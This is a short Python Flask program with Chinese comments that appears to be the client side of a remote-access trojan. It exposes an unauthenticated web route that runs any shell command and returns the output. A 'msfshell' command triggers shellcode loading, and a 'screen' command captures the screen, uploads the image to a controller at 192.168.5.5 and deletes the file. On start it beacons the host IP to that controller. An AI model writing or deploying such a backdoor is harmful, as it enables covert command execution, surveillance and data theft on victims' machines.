import os

import chardet
from flask import Flask
import requests
import random
import subprocess
import base64
import socket
import time
import ctypes
import stage

app = Flask(__name__)

# 获取当前主机 IP 地址
def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip


def get_host_ip_2():
    try:
        # 获取本机（计算机）名
        hostname = socket.gethostname()
        # 获取本机（计算机）ip
        # ip = socket.gethostbyname(hostname)
        # ip = socket.gethostbyname_ex(hostname)
        ip = socket.gethostbyname_ex(hostname)[-1][-1]
    except Exception as e:
        print(e)
    return ip


# 调用cmd执行系统命令
def cmd(command: str):
    command = command.encode()
    # 调用 subprocess.Popen 执行命令
    p = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    # 接收命令执行后的返回信息，获取到的是中文为二进制字符，需要转码
    data = p.stdout.read()
    # 获取编码方式
    encoding = chardet.detect(data)['encoding']
    # 解码
    out = "".join(data.decode(encoding))
    # 数据返回
    # 对数据进行加密处理
    return out

@app.route('/cmd/<command>')
def client_cmd(command):
    if command == "msfshell":
        stage.shellcode()
    elif command == "screen":
        imagename = "screen.jpg"
        stage.screen(imagename)
        with open(imagename,'rb') as image:
            out = image.read()
            requests.post(url="http://192.168.5.5:8090/upload/",data=out)
        os.system('del '+imagename)

    else :
        out = cmd(command=command)
        return out

def heartbeat():
    host = get_host_ip()
    requests.post('http://192.168.5.5:8090/info/', data={'uid': host})



if __name__ == '__main__':
    heartbeat()
    app.run('0.0.0.0',81,debug=True)
